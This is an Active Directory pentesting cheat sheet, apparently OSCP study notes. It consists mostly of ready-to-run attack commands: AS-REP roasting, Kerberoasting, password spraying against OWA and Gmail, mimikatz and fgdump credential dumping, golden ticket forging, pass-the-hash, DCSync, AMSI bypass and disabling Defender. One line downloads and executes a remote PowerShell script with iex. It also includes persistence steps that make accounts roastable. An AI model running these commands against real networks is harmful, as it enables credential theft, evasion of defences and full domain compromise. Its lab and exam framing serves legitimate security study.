# Pentesting Active Directory


### Cheatsheat

[John Woodman's site](https://wadcoms.github.io/)

Modeled after GTFOBINs and LOLBAS but for attacking active directory.

### INDEX


[Basic Overview](#basic-overview)

[Recon](#recon-ad)

[User Enumeration without Creds](#enumerating-ad-users-without-having-creds-or-session)

[Enumerating AD WITH creds](#enumerating-ad-with-creds)

[Attacking Active Directory](#attacking-ad)

- [Kerberoasting(users)](#kerberoasting)

- [Leftover tickets(users)](#current-session-tickets)

- [Local Privilege Escalation(users)](#local-priv-esc)

- [Cached Credential Extraction(admins)](#cached-creds)

- [Pass The Hash/Key](#passing-hashes-and-keys)

- [10 attacks you need to know for oscp](#top-10)



# Basic Overview
[back to top](#index)


A administrative tool made by Microsoft, used to create and manage domains, users, and objects within a network. This allows for different privileges and access that scales even with very large numbers of users, computers, domains, ect..

Organized in a Tiered structure of:

1) Domains
2) Trees
3) forests

Domains consist of users, devices, databases (all known also as objects) that are grouped together. Tree's are formed by grouping one or more Domain's. Forests are formed by grouping one or more trees.

### Main concepts of an Active Directory:

1. Directory – Contains all the information about the objects of the Active directory
2. Object – An object references almost anything inside the directory (a user, group, shared folder...)
3. Domain – The objects of the directory are contained inside the domain. Inside a "forest" more than one domain can exist and each of them will have their own objects collection.
4. Tree – Group of domains with the same root. Example: dom.local, email.dom.local, www.dom.local
5. Forest – The forest is the highest level of the organization hierarchy and is composed by a group of trees. The trees are connected by trust relationships.

### Active Directory Domain Services

Active Directory provides several different services, which fall under the umbrella of "Active Directory Domain Services," or AD DS. These services include:

- Domain Services – stores centralized data and manages communication between users and domains; includes login authentication and search functionality
- Certificate Services – creates, distributes, and manages secure certificates
- Lightweight Directory Services – supports directory-enabled applications using the open (LDAP) protocol
- Directory Federation Services – provides single-sign-on (SSO) to authenticate a user in multiple web applications in a single session
- Rights Management – protects copyrighted information by preventing unauthorized use and distribution of digital content

AD DS is included with Windows Server (including Windows Server 10) and is designed to manage client systems. While systems running the regular version of Windows do not have the administrative features of AD DS, they do support Active Directory. This means any Windows computer can connect to a Windows workgroup, provided the user has the correct login credentials. 

# Recon AD
[back to top](#index)

## With No Creds or Sessions

### 1. Pentest the network

- Scan the network, find machines, open ports. Follow the normal network methodology for this. 
- Check printers (can be unique targets in AD) check [hacktricks guide](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-information-in-printers)

 - Enumerate DNS - could give information about key servers in the domain as web, printers, shares, vpn, media, etc:

```bash
gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt
```
### 2. Check for null and Guest access on smb services (this won't work on modern Windows versions):

enum4linux
```bash
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
```
smbmap
```bash
smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>
```
smblcient
```bash
smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
```


### 3. Enumerate Ldap

- Auto-enumerate with nmap:
```bash

```

- Manual-enumeration with ldapsearch (can also use python to interact with api)

```bash
# ldapsearch
# CLI utility for querying an LDAP directory.
# More information: <https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html>.

# Query an LDAP server for all items that are a member of the given group and return the object's displayName value:                                                                                                                  
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host -b base_ou 'memberOf=group1' displayName

# Query an LDAP server with a no-newline password file for all items that are a member of the given group and return the object's displayName value:                                                                                  
ldapsearch -D 'admin_DN' -y 'password_file' -h ldap_host -b base_ou 'memberOf=group1' displayName

# Return 5 items that match the given filter:
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host -b base_ou 'memberOf=group1' -z 5 displayName

# Wait up to 7 seconds for a response:
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host -b base_ou 'memberOf=group1' -l 7 displayName

# Invert the filter:
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host -b base_ou '(!(memberOf=group1))' displayName

# Return all items that are part of multiple groups, returning the display name for each item:
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host '(&(memberOf=group1)(memberOf=group2)(memberOf=group3))' "displayName"                                                                                                            

# Return all items that are members of at least 1 of the specified groups:
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host '(|(memberOf=group1)(memberOf=group1)(memberOf=group3))' displayName                                                                                                              

# Combine multiple boolean logic filters:
ldapsearch -D 'admin_DN' -w 'password' -h ldap_host '(&(memberOf=group1)(memberOf=group2)(!(memberOf=group3)))' displayName                             
```


### 4. Poison the network (dont for oscp exam)

- Responder.py to gather creds
- Access host via relay attack
- Gather creds exposion fak UPNP srvices with Evil-SSDP

### 5. OSINT

- Extract usernames/names from internal documents, social media, services (mainly web) inside the domain environments and also from the publicly available.

- If you find the complete names of company workers, you could try different AD username conventions

## Enumerating AD users without having Creds or Session
[back to top](#index)

You can use Kerberos (the AD gatekeeper) to see if a user exitist

| Username is | Server Response | Server Error |
| - | - | - |
| Invalid | Kerberos Error:  | `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` |
| Valid | `TGT in a AS-REP`  | - |
| Valid | Kerberos Error: | `KRB5KDC_ERR_PREAUTH_REQUIRED` |

Serveral Tools exists to help with this including nmap, msf, cme and kerbrute:

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>

Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
```

#### OWA (Outlook Web Access) server

if you found one of these servers in the network you can also perform user enumeration against it. For example, you could use the tool [mailsniper](https://github.com/dafthack/MailSniper)
```cmd
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

If we already have first and last names the following python script can make common usernames from them:

```python
#!/usr/bin/env python3

'''
NameMash by superkojiman

Generate a list of possible usernames from a person's first and last name. 

https://blog.techorganic.com/2011/07/17/creating-a-user-name-list-for-brute-force-attacks/
'''

import sys
import os.path

if __name__ == '__main__': 
    if len(sys.argv) != 2:
        print(f'usage: {sys.argv[0]} names.txt')
        sys.exit(0)

    if not os.path.exists(sys.argv[1]): 
        print(f'{sys.argv[1]} not found')
        sys.exit(0)

    with open(sys.argv[1]) as f:
        for line in enumerate(f): 

            # remove anything in the name that aren't letters or spaces
            name = ''.join([c for c in line[1] if  c == ' ' or  c.isalpha()])
            tokens = name.lower().split()

            if len(tokens) < 1: 
                # skip empty lines
                continue
            
            # assume tokens[0] is the first name
            fname = tokens[0]

            # remaining elements in tokens[] must be the last name
            lname = ''

            if len(tokens) == 2: 
                # assume traditional first and last name
                # e.g. John Doe
                lname = tokens[-1]

            elif len(tokens) > 2: 
                # assume multi-barrelled surname
                # e.g. Jane van Doe

                # remove the first name
                del tokens[0]

                # combine the multi-barrelled surname
                lname = ''.join([s for s in tokens])

            # create possible usernames
            print(fname + lname)           # johndoe
            print(lname + fname)           # doejohn
            print(fname + '.' + lname)     # john.doe
            print(lname + '.' + fname)     # doe.john
            print(lname + fname[0])        # doej
            print(fname[0] + lname)        # jdoe
            print(lname[0] + fname)        # djoe
            print(fname[0] + '.' + lname)  # j.doe
            print(lname[0] + '.' + fname)  # d.john
            print(fname)                   # john
            print(lname)                   # joe
```

### Okay we have a valid username, how to get the password:
[back to top](#index)


#### ASREPRoast

1. ASREPRoats:  If a user doesn't have the attribute DONT_REQ_PREAUTH you can request a AS_REP message for that user that will contain some data encrypted by a derivation of the password of the user.

Enumerating vulnerables users

```ps
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

Request AS_REP message

```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
````

```ps
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)

#AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
```

Cracking

```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
```

Persistence 

```ps
#Force preauth not required for a user where you have GenericAll permissions (or permissions to write properties):
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

#### Password Spraying

Password Spraying -Let's try the most common passwords with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!) or could login with empty password: 

##### 1. Get Password Policy 

**Notice that you could lockout some accounts if you try several wrong passwords (by default more than 10).**

If you have some user credentials or a shell as a domain user you can get the password policy with:

CME
```bash
crackmapexec <IP> -u 'user' -p 'password' --pass-pol
```

enum4linux
```bash
enum4linx -u 'username' -p 'password' -P <IP>
```

Powerview
```bash
(Get-DomainPolicy)."SystemAccess" #From powerview
```

#### 2. Exploit

Some automatic tools

CME
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
```

kerbrute(often fails, last resort)
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
# Can also tell if username is valid
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
```

msf
```
msf6> use scanner/smb/smb_login
```


Rubeus:
```ps
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```

Some manual Scripts to try (best not to try more than 5/7 per account)

[DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) from dafthack

```ps
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```

[spray.sh](https://github.com/Greenwolf/Spray) from Greenwolf

```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```

##### Outlook Web Access

DomainPasswordSpray.ps1 can do this, as well as msf Owa_login and Owa_ews_login modules. The following two are also valid:

Ruler (haven't used by hacktricks says it is reliable)
```bash
$ ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
    [x] Failed: larsson:Summer2020
    [x] Failed: cube0x0:Summer2020
    [x] Failed: a.admin:Summer2020
    [x] Failed: c.cube:Summer2020
    [+] Success: s.svensson:Summer2020
    [x] Failed: s.sven:Summer2020
    [x] Failed: j.jenny:Summer2020
    [x] Failed: t.teresa:Summer2020
    [x] Failed: t.trump:Summer2020
    [x] Failed: a.adams:Summer2020
    [x] Failed: l.larsson:Summer2020
    [x] Failed: CUBE0X0:Summer2020
    [x] Failed: A.ADMIN:Summer2020
    [x] Failed: C.CUBE:Summer2020
    [+] Success: S.SVENSSON:Summer2020
```

With [MailSniper.ps1](https://github.com/dafthack/MailSniper) also by dafthack
```ps
#Invoke-PasswordSprayOWA will attempt to connect to an OWA portal and perform a password spraying attack using a userlist and a single password.
Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile owa-sprayed-creds.txt

#Invoke-PasswordSprayEWS will attempt to connect to an EWS portal and perform a password spraying attack using a userlist and a single password.
Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt

# GMAIL
Invoke-PasswordSprayGmail -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile gmail-sprayed-creds.txt
```



# Enumerating AD WITH creds
[back to top](#index)

Having compromised an account is a big step to start compromising the whole domain, because you are going to be able to start the Active Directory Enumeration:

## Manual enumeration with

#### [CMD](https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#users)

or a bit sneakier

### [powershell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

or a bit more advanced

### [Powerview/Sharpview](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)

Check out the full guides, here's a quick clip from the low-hanging fruit of powerview, with hacktricks

```
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```

## AdExplorer
A tool with GUI that you can use to enumerate the directory is AdExplorer.exe from SysInternal Suite.

## Bloodhound

Another amazing tool for recon in an active directory is [Bloodhound](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound)  It is not very stealthy (depending on the collection methods you use), but if you don't care about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.

Bloodhound uses Ingestors to collect the data that you will then view in graph form.

#### Windows

They have several options but if you want to run SharpHound from a PC joined to the domain, using your current user and extract all the information you can do:
```ps
./SharpHound.exe --CollectionMethod All
Invoke-BloodHound -CollectionMethod All
```
If you wish to execute SharpHound using different credentials you can create a CMD netonly session and run SharpHound from there:
```cmd
runas /netonly /user:domain\user "powershell.exe -exec bypass"
```




#### Python only

If you have domain credentials you can run a python bloodhound ingestor from any platform so you don't need to depend on Windows.

Get from

https://github.com/fox-it/BloodHound.py

or `pip3 install bloodhound`

Execute with:

```ps
bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
```
If you are running it through proxychains add `--dns-tcp` for the DNS resolution to work throught the proxy.

```ps
proxychains bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all --dns-tcp
```


# Attacking AD
[back to top](#index)


## Kerberoasting

*The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline.*
*You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.*

**You need valid credentials inside the domain.**

### Kerberoast From Linux

```bash
msf> use auxiliary/gather/get_user_spns

GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted

GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
```

### Kerberoast From Windows

From memory to disk
```ps
Get-NetUser -SPN | select serviceprincipalname #PowerView, get user service accounts

#Get TGS in memory
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local 
 
klist #List kerberos tickets in memory
 
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
```

On-Disk (more visible)
```cmd
# Powerview
Request-SPNTicket -SPN "<SPN>" #Using PowerView Ex: MSSQLSvc/mgmt.domain.local

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
### Kerberoast Cracking

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast

hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Kerberoasting Persistence

If you have enough permissions over a user you can make it kerberoastable:

```ps
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```

Tool for kerberoast
https://github.com/nidem/kerberoast

### Issues kerberoasting 

If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it because of your local time, you need to synchronise the host with the DC: 

```bash
ntpdate <IP of DC>
```

## Local Priv Esc

Use a guide like the one here or on [Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) and use something like [Hacktricks-Windows-privesc Checklist](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)

## Current Session Tickets

It's very unlikely that you will find tickets in the current user giving you permission to access unexpected resources, but you could check:

```
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

## Cached Creds

If you are already administrator on a domain connected machine you can dump local hashes and try and crack them, or pivot with pass or overpass the hash.

This can be done with **fgdump** on older machines and **mimikatz** on most new machines. (Note may have to turn defender off)

#### Mimi cheatsheat

```ps
#general
privilege::debug
log
log customlogfilename.log


#sekurlsa
sekurlsa::logonpasswords
sekurlsa::logonPasswords full
sekurlsa::tickets /export
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd

#kerberos
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi

#crypto
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
crypto::keys /export
crypto::keys /machine /export

#vault & lsadump
vault::cred
vault::list
token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

#pth
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe

#ekeys
sekurlsa::ekeys

#dpapi
sekurlsa::dpapi

#minidump
sekurlsa::minidump lsass.dmp

#ptt
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi

#golden/silver
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi

#tgt
kerberos::tgt

#purge
kerberos::purge
```
#### fgdump Cheatsheat:

```cmd
# Dumping a Local Machine Using the Current User
fgdump.exe

# Dumping the Local Machine Using a Different Account
fgdump.exe -h 127.0.0.1 -u AnAdministrativeUser

# Dumping a Remote Machine (192.168.0.10) Using a Specified User (1)
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser

# Dumping a Remote Machine (192.168.0.10) Using a Specified User (2)
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -p l4mep4ssw0rd

# Dumping Many Remote Machines, All With the Same Password
fgdump.exe -f hostfile.txt -u AnAdministrativeUser

# Dumping Many Remote Machines, Each With Its Own Username and Password
fgdump.exe -H combofile.txt

# Dumping Many Remote Machines More Efficiently
fgdump.exe -f hostfile.txt -u AnAdministrativeUser -T 10

# Dumping Hosts and Logging Output
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -l myoutput.log

# Dumping Hosts, Logging Output and Viewing Verbose Messages
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -l myoutput.log -v -v

# Dumping a Host Without Password Histories
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -o

# Dumping a Host Without Cachedump or Pwdump Output
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -c (or -w for skipping pwdump)

# Dumping Protected Storage
fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -s

## Protected storage can contain interesting secrets, including passwords for IE and Outlook if a user opted to have those programs remember passwords.

# Cracking passwords with john
## Passwords will usually be in username:LM_hash:NTLM_hash
## Example:MyUser:1188:E52CAC67419A9A224A3B108F3FA6CB6D:A4F49C406510BDCAB6824EE7C30FD852:::
## Saved to passwordhashes.txt then the command:
./john passwordhashes.txt
```

# Passing Hashes and keys

If You can't crack those hashes you can pass them or overpass them 

## PTH From windows:

Can be done with 

mimikatz (powershell version here)
```ps
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' 
```

psexec_windows.exe
```cmd
psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local
```

wmiexec.exe 
```cmd
wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local
```

Or many powershell scripts from [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) that do SMB, WMI and some other magic.


## PTH From Linux

Kali has a wide-array of pth tools wrapped into a passing-the-hash package:

Install with

`sudo apt install passing-the-hash`

From tab-completion just to show the options.
```
─$ pth-
pth-curl       pth-rpcclient  pth-smbget     pth-winexe     pth-wmis                                 
pth-net        pth-smbclient  pth-sqsh       pth-wmic                     
```

## OVER-PASS-THE-HAS/PASS the Key attack

This attack aims to use the user NTLM hash or AES keys to request Kerberos tickets, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially useful in networks where NTLM protocol is disabled and only Kerberos is allowed as authentication protocol.


#### OverPass-The-Hash Via impacket
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
You can specify -aesKey [AES key] to specify to use AES256.
You can also use the ticket with other tools like: as smbexec.py or wmiexec.py

Possible issues

- PyAsn1Error(‘NamedTypes can cast only scalar values’,) : Resolved by updating impacket to the lastest version.
- KDC can’t found the name : Resolved by using the hostname instead of the IP address, because it was not recognized by Kerberos KDC.

### OverPass-The-Hash Via rubeus/psexec

```cmd
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```

### Pass-The-Key with Rubeus

This kind of attack is similar to Pass the Key, but instead of using hashes to request for a ticket, the ticket itself is stolen and used to authenticate as its owner.

*When a TGT is requested, event 4768: A Kerberos authentication ticket (TGT) was requested is generated.  You can see from the output above that the KeyType is RC4-HMAC (0x17), but the default type for Windows is now AES256 (0x12).*

```cmd
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```



notes from https://www.youtube.com/watch?v=xowytiyooBk (great youtube vid)


# Top 10
[back to top](#index)


Ten attacks you should master for the OSCP:


10. ReadGMSAPassword 
Description: ReadGMSAPassword allows an attacker to use the password of a Group Managed Service Account which usually has elevated privileges. 
Environment: Search from HacktheBox

9. GenericWrite/GenericAll/AllExtendedRights 
Description: GenericAll allows an attacker to modify the object in question. In this example, we change the password of a Domain Administrator. GenericWrite allows the modification of certain things (More on this in Object from Hackthebox).
Environment: Search from HacktheBox


8. ForceChangePassword 
Description: ForceChangePassword allows an attacker to change the password of the object in question.
Environment: Object from Hackthebox
Timestamp: 16:31

7. PowerView 
Description: Allows for additional manipulation of Active Directory. Many of the commands presented by BloodHound require PowerView.
Environment: Object from Hackthebox
Timestamp: 17:00

6. WriteOwner
Description: WriteOwner permissions allows an attacker to set the owner of the object and make him/herself a member of the object.
Environment: Object from HackTheBox
Timestamp: 23:48

5. SeBackupPrivilege and SeRestorePrivilege
Description: SeBackupPrivilege and SeRestorePrivilege allows the attacker access to any file on the machine given he/her takes the appropriate steps. In this example, we acquire NTDS.dit and System.hive
Environment: Blackfield from Hackthebox
Timestamp: 28:12

4. NTDS.dit and System.hive
Description: With these files and the appropriate permissions, an attacker can dump hashes from the Domain Controller using DCSync.
Environment: Blackfield from Hackthebox
Timestamp: 34:38

3. Account Operators/WriteDACL
Description: In the account operators group, an attacker can create users and place them in non-protected groups. Placing a new user in a group with WriteDACL, enables an attacker to modify the new user's DACL. In this example, we give our new user DCSync rights.
Environment: Forest from Hackthebox 
Timestamp: 42:24

2. ByPassing AMSI 
Description: It may be necessary to bypass the anti-virus in Active Directory. Attackers can attempt to bypass AMSI with the Bypass-4MSI command in Evil-WinRM. Always run this command before introducing a malicious script to the environment. 
Environment: Forest from Hackthebox
Timestamp: 48:11

1.DCSYNC/GetChangesAll/Replication
Description: This is number one because its the most fun. DCSync allows an attacker to impersonate a Failover Domain Controller. In that context, the production Domain Controller shares all user hashes upon request, ergo DCSYNC. GetChangesAll, Replication and AllowedToDelegate all point toward the possibility of DCSYNC.
Environment: Forest/Sizzle 
Timestamp: 53:14
